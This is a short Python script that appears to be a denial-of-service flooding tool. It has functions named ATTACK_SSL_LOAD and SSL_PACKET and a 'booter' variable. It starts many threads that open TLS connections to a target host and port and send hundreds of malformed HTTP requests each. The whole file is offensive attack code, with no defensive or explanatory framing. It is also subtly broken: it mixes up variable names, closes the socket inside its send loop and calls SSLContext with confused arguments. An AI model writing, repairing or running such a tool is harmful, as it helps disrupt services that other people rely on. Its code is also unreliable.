import ssl,sys
import socket
import random
import string
from urllib.parse import urlparse
import threading

def generate_url_path(num):
    data = "".join(random.sample(string.printable, int(num)))
    return data

def get_target(url):
    url = url.rstrip()
    target = {}
    parsed_url = urlparse(url)
    target['uri'] = parsed_url.path or '/'
    target['host'] = parsed_url.netloc
    target['scheme'] = parsed_url.scheme
    return target

def SSL_PACKET(target,methods,time,port):
    for _ in range(time):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(port)))
            s.connect_ex((str(target['host']),int(port)))
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2)
            ssl_context.set_ciphers('AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_8_SHA256')
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
                url_leak = target['uri']
            else:
                url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(500):
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
                ssl_socket.close()
        except:
             print('FAILED')
def ATTACK_SSL_LOAD(target,time,methods,thread,port):
   for _ in range(int(thread)):
       threading.Thread(target=SSL_PACKET,args=(target,methods,time,port)).start()

url_Leak = ''
methods_got = ''
port = 0
time = 0
if len(sys.argv) == 5:
 url_leak = str(sys.argv[1])
 port = int(sys.argv[2])
 time_booter = int(sys.argv[3])
 methods = str(sys.argv[4])
target = get_target(url_Leak)
threading.Thread(target=ATTACK_SSL_LOAD,args=(target,time,methods_got,60,port)).start()